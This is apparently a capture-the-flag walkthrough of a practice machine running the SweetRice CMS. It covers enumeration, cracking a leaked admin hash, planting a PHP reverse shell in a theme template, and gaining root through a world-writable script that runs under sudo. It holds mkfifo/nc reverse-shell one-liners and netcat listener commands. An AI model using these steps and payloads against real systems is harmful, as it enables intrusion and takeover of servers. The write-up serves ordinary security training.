@@ -1,0 +1,173 @@
+//Lazy Admin//
+
+{{Nmap Scan}}
+
+nmap -sV -T4 [machine IP]
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-29 16:07 EST
+Nmap scan report for [machine IP]
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
+
+Visiting http://[machine IP] in a browser, we see an Apache2 Default page. 
+Let's run gobuster and see if there is more:
+
+{{Gobuster}}
+
+gobuster -u [machine IP] -w /path/to/wordlist.txt -t 250 -x txt,html,php
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.9.237/
+[+] Threads      : 250
+[+] Wordlist     : /home/techtyte/thm/dirbcommon.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : txt,html,php
+[+] Timeout      : 10s
+=====================================================
+2022/01/29 15:18:59 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.html (Status: 403)
+/.hta.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.html (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.php (Status: 403)
+/content (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/server-status (Status: 403)
+
+/content looks interesting. Visiting the page, we are greeted with:
+
+
+Welcome to SweetRice - Thank your for install SweetRice as your website management system.
+This site is building now , please come late.
+
+If you are the webmaster,please go to Dashboard -> General -> Website setting
+
+and uncheck the checkbox "Site close" to open your website.
+
+More help at Tip for Basic CMS SweetRice installed
+
+Let's run gobuster one more time with /content/, to see if we can find anything else interesting.
+
+gobuster -u [machine IP]/content -w /path/to/wordlist.txt -t 250 -x txt,html,php
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.9.237/content/
+[+] Threads      : 250
+[+] Wordlist     : /home/techtyte/thm/dirbcommon.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : txt,html,php
+[+] Timeout      : 10s
+=====================================================
+2022/01/29 15:33:01 Starting gobuster
+=====================================================
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.html (Status: 403)
+/.htaccess.php (Status: 403)
+/attachment (Status: 301)
+/.hta (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.html (Status: 403)
+/.hta.php (Status: 403)
+/as (Status: 301)
+/changelog.txt (Status: 200)
+/index.php (Status: 200)
+/images (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/license.txt (Status: 200)
+/inc (Status: 301)
+=====================================================
+2022/01/29 15:33:47 Finished
+=====================================================
+
+/as/ leads to a login page. I tried hydra, but was only given false positives (perhaps a mistake on my part, but I decided to try other avenues).
+
+/inc/ reveals an index page with some interesting files, but the one that sticks out the most is "mysql_backup/"
+Click the folder, and download the file within: "mysql_bakup_20191129023059-1.5.1.sql"
+Open the file with a text editor. The bottom includes some valuable info:
+
+14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
+  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
+  
+ "42f749ade7f9e195bf475f37a44cafcb" looks like a hash. Using crackstation or hashes.com, we get:
+ 42f749ade7f9e195bf475f37a44cafcb:Password123
+ "manager" appears to be a likely candidate for a username.
+ 
+ Go back to the login page, and try the cracked password with username "manager".
+ Success!
+ 
+ Going through the dashboard, some likely areas to explore and exploit look to be "plugin" or "themes"
+ Creating a plugin with a reverse shell script wasn't successful, so I looked around in themes.
+ We can edit them. In the drop down list, I selected "Home page template".
+ Under Modify, I pasted a reverse php script (the pentestmonkey one), and clicked done.
+ Start a listener: nc -lvnp [port]
+ 
+ Before visiting the homepage, I changed the status of the site to "running" from the dashboard.
+ Navigate to [machine IP]/content, and catch the shell.
+ 
+ The first flag is in /home/itguy/
+ 
+ {{Privilege Escalation}}
+ 
+ In the user's home folder, we see a file called "mysql_login.txt"
+ Opening it reveals:
+ rice:randompass
+ 
+ We will save this incase we need it.
+  
+ sudo -l reveals:
+ User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+Let's see what backup.pl is about.
+
+cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+Next, check out the contents of /etc/copy.sh:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+$ ls -la copy.sh
+-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh
+
+This shows us that we have write capabilities for this file.
+Let's take the contents and put our own tun0 IP and port number in there.
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [machine IP] [port] >/tmp/f" > copy.sh
+
+Set up a listener:
+nc -lvnp [port]
+
+All that is left to do is to find a way to execute the script.
+Luckily, we have sudo rights to it.
+
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+Catch the shell. Flag is in /root/!
